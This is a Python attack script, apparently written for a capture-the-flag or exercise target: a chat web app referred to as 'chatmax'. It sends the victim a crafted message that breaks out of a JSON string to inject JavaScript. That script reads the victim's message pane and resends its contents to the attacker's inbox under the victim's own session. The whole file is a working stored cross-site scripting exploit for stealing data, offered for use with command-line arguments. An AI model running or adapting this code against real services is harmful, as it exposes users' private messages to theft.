
import sys
import requests
import random

def convert_to_num(password):
    return '-'.join([str(ord(x)) for x in list(password)])

def send_msg_to_user(from_name, from_pw, to_name, msgbody, hostname, port):
    msg = '{{"from": "root","subject":"TEST","date":"Thu Oct 13 22:55:51 2016","body":"{}"}}'.format(msgbody).replace('\n','\\n').replace('\r','\\r')
    msg += '//END_MSG//'
    msg += chr(0) * (16 - (len(msg) % 16))
    url_path = '${}?pw={}&un={}&msg={}&to={}.inbox'.format(random.randint(0, int(1e18)), convert_to_num(from_pw), convert_to_num(from_name), convert_to_num(msg), convert_to_num(to_name))
    headers = {'Referer': 'http://{}:{}/home.html'.format(hostname, port)}
    request_url = 'http://{}:{}/{}'.format(hostname, port, url_path)
    return request_url

def javascript_msg_send(msg_body, recipient):
    return 'var msg_body = {}; var recipient = "{}";'.format(msg_body, recipient) + '''
    var send_msg = function(subject, msg_body, recipient) {
    var _14 = '{"from": "' + chatmax.username + '",' + '"subject":"' + subject +  '",' + '"date": "' + (new Date()).toString() + '",' + '"body": "' + msg_body.replace(/\\n/g, '\\\\n').replace(/\r/g, '\\r') + '"}';
    _14+='//END' + '_MSG//';
    var _15 = 16 - (_14.length % 16);
    if ((_15 > 0) && (_15 != 16)) {
    while (_15-- > 0) {
    _14 += String.fromCharCode(0);
    }
    }
    var url = '$' + Math.random().toString().replace('.', '') + '?pw=' + chatmax.scramble(chatmax.password) + '&un=' + chatmax.scramble(chatmax.username) + '&msg=' + chatmax.scramble(_14) + '&to=' + chatmax.scramble(recipient) + '.inbox';
    console.log(url);
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.send();
    console.log('TEST_BACK: Sent');
    };
    msgs = msg_body.split('textarea');
    var msg_count = 0;
    var divider = '----------------------------\\n';
    for (var i = 0; i < msgs.length; i++) {
    if (msgs[i].length > 2) {
    msg_count++;
    var parsed_msg = msgs[i].split('>')[1].replace(/"/g,'|').slice(0, -2);
    send_msg('My Message ' + msg_count, divider + parsed_msg, recipient);
    }
    }
'''.replace('\n',' ')

def exfil(my_name, my_pw, attack_name, hostname, port):
    sendback_msgbody = 'document.getElementById("messagesDiv").innerHTML;'
    msgbody = '" + ( function(){ setTimeout( function() {' + javascript_msg_send(sendback_msgbody , my_name) + ' }, 1000); return "hi";})() + "'
    #print(msgbody)
    request_url = send_msg_to_user(my_name, my_pw, attack_name, msgbody, hostname, port)
    try:
        r = requests.get(request_url)
        print (r.url)
        print (r.text)
        if r.status_code == requests.codes.ok:
            return True
        else:
            return False
    except requests.exceptions.ConnectionError:
        return True

def main():
    if len(sys.argv) != 6:
        print('Usage:', sys.argv[0], '<username>', '<password>', '<attackname>', '<hostname>', '<port>')
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    attackname = sys.argv[3]
    hostname = sys.argv[4]
    port = int(sys.argv[5])

    if exfil(username, password, attackname, hostname, port):
        print('Attack seems to have worked, check your inbox')
    else:
        print('Exfiltration failed')

if __name__ == '__main__':
    main()

